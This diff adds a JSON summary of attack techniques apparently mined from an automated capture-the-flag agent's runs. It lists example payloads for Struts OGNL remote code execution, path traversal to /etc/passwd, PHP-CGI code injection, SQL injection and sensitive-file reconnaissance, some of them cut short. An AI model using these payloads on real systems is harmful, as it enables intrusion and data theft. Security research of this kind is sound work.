@@ -1,0 +1,104 @@
+{
+  "schema_version": 1,
+  "policy_version": "pol-733f22810cd1",
+  "source": "data\\training\\transitions-20261103T161417Z.jsonl",
+  "split_used": "train",
+  "dead_ends": [],
+  "techniques_effective": [
+    {
+      "kind": "technique_effective",
+      "id": "technique_effective-bffb34057432",
+      "technique": "rce.ognl",
+      "runs_fact": 10,
+      "runs_dead": 6,
+      "example": "cat > {{linux_path}} << 'EOF'\n#!/usr/bin/env python3\nimport requests\n\ntarget = \"{{target_url}}\"\n\n# S2-046 payload to execute: env | grep -i flag\n# Full OGNL payload with ProcessBuilder for command execution and output capture\npayload = \"\"\"%",
+      "source_run_ids": [
+        "151726b8-03c2-4ada-a17e-75832e1bf95a",
+        "1cd3d5da-6be4-447a-a955-0544f3ac0234",
+        "4444097b-4847-4f9f-a6d0-209c6ee508cf",
+        "536cdd99-5691-4c94-a069-8952502b3328",
+        "80634a7a-6992-4679-91fb-b0b8aa1aeef1",
+        "8d6a2044-6ea7-406b-837a-44f8d9a6a9a6",
+        "b090f32f-2709-44d6-852e-73e7eee69b2b",
+        "c32402ff-1912-4aa8-83d4-e77b4655b51e",
+        "cb8baf70-b9e6-4b27-9002-00246a3ef952",
+        "d2cfee07-0e39-41d9-b3bd-8007603e8ddb"
+      ]
+    },
+    {
+      "kind": "technique_effective",
+      "id": "technique_effective-e559fa84009b",
+      "technique": "lfi.traversal",
+      "runs_fact": 5,
+      "runs_dead": 9,
+      "example": "/bin/bash -lc \"curl -sv --max-time 20 '{{target_url}}/index.php?target=db_sql.php%253f/../../../../../../etc/passwd' 2>&1 | head -80\"",
+      "source_run_ids": [
+        "3903a584-2a15-4922-bad9-78ce9db12b32",
+        "74cfefda-95e2-491e-8c51-2a4e73e0ffc7",
+        "928c6658-a3d0-4e2b-9d84-f82bf95eb6f1",
+        "9e22dfb5-4061-436e-a972-ea6ff786de25",
+        "bf8479cb-2922-47fa-a396-157e7a72bfb2"
+      ]
+    },
+    {
+      "kind": "technique_effective",
+      "id": "technique_effective-424fe438e786",
+      "technique": "recon.source",
+      "runs_fact": 3,
+      "runs_dead": 7,
+      "example": "/bin/bash -lc \"cd {{linux_path}} && B={{target_url}} for p in README ChangeLog Documentation.html LICENSE setup/ scripts/setup.php config.inc.php phpinfo.php server_status.php robots.txt .git/config phpmyadmin.css.php favicon.ico themes/pma",
+      "source_run_ids": [
+        "3a8fe905-d77c-46b0-b1ee-7133e400896b",
+        "ab337d77-8d6e-43f9-9d32-8b09aaf9cf0c",
+        "d2cfee07-0e39-41d9-b3bd-8007603e8ddb"
+      ]
+    },
+    {
+      "kind": "technique_effective",
+      "id": "technique_effective-4c8302cc1714",
+      "technique": "lfi.wrapper",
+      "runs_fact": 3,
+      "runs_dead": 6,
+      "example": "/bin/bash -lc \"cd {{linux_path}} curl -s -m 20 '{{target_url}}/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input' --data '<?php system(\\\"id; echo FLAG=\"'$FLAG; printenv; ls -la / /tmp {{linux_path}} {{linux_path}} 2>&1\"",
+      "source_run_ids": [
+        "1cd7ad91-d74a-47d2-8e1a-da80db60d8e7",
+        "9e22dfb5-4061-436e-a972-ea6ff786de25",
+        "df8e796d-c7a9-43be-9e11-79aaac355057"
+      ]
+    },
+    {
+      "kind": "technique_effective",
+      "id": "technique_effective-6831db702a24",
+      "technique": "sqli.boolean",
+      "runs_fact": 2,
+      "runs_dead": 4,
+      "example": "curl -s \"{{target_url}}/check.php?username={{secret_value}}' or '1'='1&password={{secret_value}}\"",
+      "source_run_ids": [
+        "1a51975b-dbb8-430e-aa3d-7bc05c26aaab",
+        "579e7d4e-bfcc-44cb-8198-e287bd8a500f"
+      ]
+    },
+    {
+      "kind": "technique_effective",
+      "id": "technique_effective-7520069c45c4",
+      "technique": "sqli.union",
+      "runs_fact": 2,
+      "runs_dead": 3,
+      "example": "/bin/bash -lc \"cd /tmp && sed -i \\\"s/j=b.find('Check All')/j=b.find('Query results operations')/\\\" q.sh && sed -i \\\"s/b\\\\[:4000\\\\]/b[:6000]/\\\" q.sh && {{linux_path}} \\\"select table_schema, table_name, table_rows from information_schema.tabl",
+      "source_run_ids": [
+        "949eecb4-ceea-43b6-bff2-0f06aa174009",
+        "b00a5218-924e-47d8-8c38-aed367e95bc5"
+      ]
+    }
+  ],
+  "techniques_dead": [],
+  "stats": {
+    "transitions_read": 43850,
+    "dead_end_candidates": 0,
+    "technique_effective_candidates": 6,
+    "technique_dead_candidates": 0,
+    "runs_behind_effective": 23,
+    "runs_behind_dead": 0
+  },
+  "generated_at": "2026-11-03T16:16:33.740199+00:00"
+}
